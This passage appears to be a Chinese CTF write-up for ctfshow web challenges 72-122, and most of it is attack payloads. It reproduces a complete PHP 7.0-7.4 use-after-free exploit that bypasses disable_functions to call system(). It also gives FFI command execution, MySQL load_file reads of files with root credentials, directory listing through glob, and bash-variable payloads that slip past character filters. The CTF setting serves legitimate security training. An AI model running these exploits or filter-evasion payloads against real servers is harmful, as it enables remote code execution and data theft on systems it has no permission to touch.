$file)&#123;print($file-&gt;getFilename());&#125;;exit(0);c=$dir = new DirectoryIterator(&quot;glob:///*&quot;);foreach($dir as $file)&#123;echo $file-&gt;getFilename().&quot;&lt;br&gt;&quot;;&#125;;exit(0); ob_get_contents函数获得缓冲区的内容，即在此为代码执行的输出结果 在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。 ob_end_clean函数清除缓冲区的内容。 此时得用一个函数ob_get_contents()在ob_end_clean()前面来获得缓冲区的内容。这样的话，能将在执行ob_end_clean()前把内容保存到一个变量中，然后在ob_end_clean()函数执行后对这个变量做操作。 exit() 函数输出一条消息，并退出当前脚本。 那么在执行完代码之后结束脚本的运行就可以了 1.44 Web 72 — disable_functions — php7-backtrace-bypass 脚本1&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ php7-backtrace-bypass 脚本 1c=function ctfshow($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd); exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush(); 1&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&quot;uname -a&quot;);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;constant&#x27; constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;bin2hex&#x27; constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat(&#x27;A&#x27;, 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat(&#x27;A&#x27;, 79)); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125; https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php 1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit(); 1 1.45 Web 73 — disable_functions — DirectoryIterator1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 1c=include(&#x27;/flagc.txt&#x27;);exit(); 1.46 Web 74 — disable_functions — DirectoryIterator1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr varc=include(&#x27;/flagx.txt&#x27;);exit(); 1.47 Web 75 — disable_functions — 数据库、SQL 语句1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var SQL 语句绕过 1c=try &#123; $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;); foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0);&#125;exit(0);# 即c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0); 1.48 Web 76 — disable_functions — 数据库、SQL 语句1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 1c=try &#123; $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;); foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0);&#125;exit(0);# 即c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0); 1.50 Web 77 — disable_functions — FFI 扩展命令FFI 扩展命令 参考 1# 版本 php7.4 扩展简介FFI 是在 PHP 7.4 版本中新加入的，此扩展允许在 PHP 代码中加载共享库(.DLL 或 .so)，调用 C 函数及访问 C 数据结构，简单的说就是允许在 PHP 中运行 C 代码，可以方便的调用C语言的各种库，但同时它的使用伴随着很大的风险 使用配置使用 FFI 首先要开启扩展，在 php.ini 中去掉 extension=ffi 前面的 ; 并且修改 ffi.enable=true 即可使用，在phpinfo() 中可以查看是否开启了此扩展 1# 示例&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;echo Hello World&gt;./ttmp&quot;); echo file_get_contents(&quot;./ttmp&quot;);?&gt; 命令执行 如果目标机器开启了这一扩展，我们就有了一种全新的命令执行方式，在 system 被禁用的情况下，则可使用 FFI 来进行命令执行，例如在题目中执行 /readflag 并获取 flag，同时它也可以加载自定义链接库 1# 命令执行&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;/readflag &gt; /tmp/123.txt&quot;);echo file_get_contents(&quot;/tmp/123&quot;); @unlink(&quot;/tmp/123&quot;);?&gt; 类似的方法在蚁剑的 bypass disable_function 中可自动调用，但受到目录权限和 open_basedir 的限制导致很多情况下并不起作用 1# payloadc=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var 1c=$ffi = FFI::cdef( &quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt; 1.txt&quot;);exit();# 即c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;test.txt&quot;);exit();# 随后访问 test.txt 即可 1.51 Web 118 — Linux bush 内置变量 — ${PATH:A}${PWD:A}flag in flag.php 查看源代码 发现 抓包发现 是 POST 传参 code bush 内置变量 https://www.cnblogs.com/sparkdev/p/9934595.html#title_12 https://blog.51cto.com/allenh/1695810 1# 测试 root@kali:~# echo $&#123;PWD&#125;/rootroot@kali:~# echo $&#123;PWD:0:1&#125;/root@kali:~# echo $&#123;PWD:0:2&#125;/rroot@kali:~# echo $&#123;PWD:1:2&#125;roroot@kali:~/桌面# echo $&#123;PWD&#125;/root/桌面root@kali:~/桌面# echo $&#123;PWD:~0&#125;面root@kali:~/桌面# echo $&#123;PWD:~2&#125;/桌面root@kali:~/桌面# echo $&#123;PWD:~1&#125;桌面# 如果过滤掉了数字，可使用字母，字母都相当于 0root@kali:~/桌面# echo $&#123;PWD:~A&#125;面root@kali:~/桌面# echo $&#123;PWD:~C&#125;面root@kali:~/桌面# echo $&#123;PWD:~K&#125;面root@kali:/var/www/html# echo $&#123;PWD::2&#125;/vroot@kali:/var/www/html# echo $&#123;PWD::1&#125;/# 构造 nlroot@kali:~/桌面# cd /var/www/html/root@kali:/var/www/html# echo $&#123;PATH&#125;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@kali:/var/www/html# echo $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;nl 1# payload$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ???????? 1.52 Web 119 — Linux bush 内置变量 — 构造 /bin/过滤了 PATH 和 BASH 一些知识点 大写字母等同于0 不加#是变量的值，加了#是变量的值的长度 1$&#123;#PWD&#125;root@kali:/var/www/html# echo $&#123;PWD&#125;/var/www/htmlroot@kali:/var/www/html# echo $&#123;#PWD&#125;13 RANDOM此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。 因此光利用RANDOM这个函数理论上就可以得到数字1-5了，不过相对来说4和5的概率会更大。 SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器 不理解也没关系，只要知道这个东西的默认值是1，而且如果不进行一些特殊的操作的话，永远都是1，所以这个可以帮助我们得到数字1。 1# 构造 /bin/base64 flag.php$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???或$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???# 构造 /bin/cat flag.php这个是hint$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ====&gt; t$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125; ====&gt; /$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? 1# payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 抓包修改 多刷新几遍 由于 4 和 5不确定 1.53 Web 120 — Linux bush 内置变量 — 长度限制 &lt;=651&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 限制长度 &lt;=65 1# payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 1.54 Web 121 — Linux bush 内置变量 — 过滤 SHLVL1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 1root@kali:/var/www/html# echo $&#123;##&#125;1root@kali:/var/www/html# echo $&#123;#?&#125;1root@kali:/var/www/html/learn# touch 1.txt root@kali:/var/www/html/learn# echo &#x27;1234567&#x27; &gt; 1.txtroot@kali:/var/www/html/learn# /bin/rev 1.1.txtroot@kali:/var/www/html/learn# /bin/rev 1.txt7654321# /bin/rev 将文件反读root@kali:/var/www/html/learn# echo $&#123;#IFS&#125;3root@kali:/var/www/html/learn# echo $&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;rroot@kali:/var/www/html/learn# echo $&#123;PWD&#125;/var/www/html/learnroot@kali:/var/www/html/learn# echo $&#123;PWD:3:1&#125;r 1# payload$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.??? 1.55 Web 122 — Linux bush 内置变量 — 过滤 # PWD ( HOME替换 ) $? 获取上一条命令执行结束后的返回值，0代表成功，非0代表失败。而且这个返回值原来是可控的 1&quot;OS error code 1: Operation not permitted&quot;&quot;OS error code 2: No such file or directory&quot;&quot;OS error code 3: No such process&quot;&quot;OS error code 4: Interrupted system call&quot;&quot;OS error code 5: Input/output error&quot;&quot;OS error code 6: No such device or address&quot;&quot;OS error code 7: Argument list too long&quot;&quot;OS error code 8: Exec format error&quot;&quot;OS error code 9: Bad file descriptor&quot;&quot;OS error code 10: No child processes&quot;&quot;OS error code 11: Resource temporarily unavailable&quot;&quot;OS error code 12: Cannot allocate memory&quot;&quot;OS error code 13: Permission denied&quot;&quot;OS error code 14: Bad address&quot;&quot;OS error code 15: Block device required&quot;&quot;OS error code 16: Device or resource busy&quot;&quot;OS error code 17: File exists&quot;&quot;OS error code 18: Invalid cross-device link&quot;&quot;OS error code 19: No such device&quot;&quot;OS error code 20: Not a directory&quot;&quot;OS error code 21: Is a directory&quot;&quot;OS error code 22: Invalid argument&quot;&quot;OS error code 23: Too many open files in system&quot;&quot;OS error code 24: Too many open files&quot;&quot;OS error code 25: Inappropriate ioctl for device&quot;&quot;OS error code 26: Text file busy&quot;&quot;OS error code 27: File too large&quot;&quot;OS error code 28: No space left on device&quot;&quot;OS error code 29: Illegal seek&quot;&quot;OS error code 30: Read-only file system&quot;&quot;OS error code 31: Too many links&quot;&quot;OS error code 32: Broken pipe&quot;&quot;OS error code 33: Numerical argument out of domain&quot;&quot;OS error code 34: Numerical result out of range&quot;&quot;OS error code 35: Resource deadlock avoided&quot;&quot;OS error code 36: File name too long&quot;&quot;OS error code 37: No locks available&quot;&quot;OS error code 38: Function not implemented&quot;&quot;OS error code 39: Directory not empty&quot;&quot;OS error code 40: Too many levels of symbolic links&quot;&quot;OS error code 42: No message of desired type&quot;&quot;OS error code 43: Identifier removed&quot;&quot;OS error code 44: Channel number out of range&quot;&quot;OS error code 45: Level 2 not synchronized&quot;&quot;OS error code 46: Level 3 halted&quot;&quot;OS error code 47: Level 3 reset&quot;&quot;OS error code 48: Link number out of range&quot;&quot;OS error code 49: Protocol driver not attached&quot;&quot;OS error code 50: No CSI structure available&quot;&quot;OS error code 51: Level 2 halted&quot;&quot;OS error code 52: Invalid exchange&quot;&quot;OS error code 53: Invalid request descriptor&quot;&quot;OS error code 54: Exchange full&quot;&quot;OS error code 55: No anode&quot;&quot;OS error code 56: Invalid request code&quot;&quot;OS error code 57: Invalid slot&quot;&quot;OS error code 59: Bad font file format&quot;&quot;OS error code 60: Device not a stream&quot;&quot;OS error code 61: No data available&quot;&quot;OS error code 62: Timer expired&quot;&quot;OS error code 63: Out of streams resources&quot;&quot;OS error code 64: Machine is not on the network&quot;&quot;OS error code 65: Package not installed&quot;&quot;OS error code 66: Object is remote&quot;&quot;OS error code 67: Link has been severed&quot;&quot;OS error code 68: Advertise error&quot;&quot;OS error code 69: Srmount error&quot;&quot;OS error code 70: Communication error on send&quot;&quot;OS error code 71: Protocol error&quot;&quot;OS error code 72: Multihop attempted&quot;&quot;OS error code 73: RFS specific error&quot;&quot;OS error code 74: Bad message&quot;&quot;OS error code 75: Value too large for defined data type&quot;&quot;OS error code 76: Name not unique on network&quot;&quot;OS error code 77: File descriptor in bad state&quot;&quot;OS error code 78: Remote address changed&quot;&quot;OS error code 79: Can not access a needed shared library&quot;&quot;OS error code 80: Accessing a corrupted shared library&quot;&quot;OS error code 81: .lib section in a.out corrupted&quot;&quot;OS error code 82: Attempting to link in too many shared libraries&quot;&quot;OS error code 83: Cannot exec a shared library directly&quot;&quot;OS error code 84: Invalid or incomplete multibyte or wide character&quot;&quot;OS error code 85: Interrupted system call should be restarted&quot;&quot;OS error code 86: Streams pipe error&quot;&quot;OS error code 87: Too many users&quot;&quot;OS error code 88: Socket operation on non-socket&quot;&quot;OS error code 89: Destination address required&quot;&quot;OS error code 90: Message too long&quot;&quot;OS error code 91: Protocol wrong type for socket&quot;&quot;OS error code 92: Protocol not available&quot;&quot;OS error code 93: Protocol not supported&quot;&quot;OS error code 94: Socket type not supported&quot;&quot;OS error code 95: Operation not supported&quot;&quot;OS error code 96: Protocol family not supported&quot;&quot;OS error code 97: Address family not supported by protocol&quot;&quot;OS error code 98: Address already in use&quot;&quot;OS error code 99: Cannot assign requested address&quot;&quot;OS error code 100: Network is down&quot;&quot;OS error code 101: Network is unreachable&quot;&quot;OS error code 102: Network dropped connection on reset&quot;&quot;OS error code 103: Software caused connection abort&quot;&quot;OS error code 104: Connection reset by peer&quot;&quot;OS error code 105: No buffer space available&quot;&quot;OS error code 106: Transport endpoint is already connected&quot;&quot;OS error code 107: Transport endpoint is not connected&quot;&quot;OS error code 108: Cannot send after transport endpoint shutdown&quot;&quot;OS error code 109: Too many references: cannot splice&quot;&quot;OS error code 110: Connection timed out&quot;&quot;OS error code 111: Connection refused&quot;&quot;OS error code 112: Host is down&quot;&quot;OS error code 113: No route to host&quot;&quot;OS error code 114: Operation already in progress&quot;&quot;OS error code 115: Operation now in progress&quot;&quot;OS error code 116: Stale NFS file handle&quot;&quot;OS error code 117: Structure needs cleaning&quot;&quot;OS error code 118: Not a XENIX named type file&quot;&quot;OS error code 119: No XENIX semaphores available&quot;&quot;OS error code 120: Is a named type file&quot;&quot;OS error code 121: Remote I/O error&quot;&quot;OS error code 122: Disk quota exceeded&quot;&quot;OS error code 123: No medium found&quot;&quot;OS error code 124: Wrong medium type&quot;&quot;OS error code 125: Operation canceled&quot;&quot;OS error code 126: Required key not available&quot;&quot;OS error code 127: Key has expired&quot;&quot;OS error code 128: Key has been revoked&quot;&quot;OS error code 129: Key was rejected by service&quot;&quot;OS error code 130: Owner died&quot;&quot;OS error code 131: State not recoverable&quot;&quot;MySQL error code 132: Old database file&quot;&quot;MySQL error code 133: No record read before update&quot;&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;&quot;MySQL error code 135: No more room in record 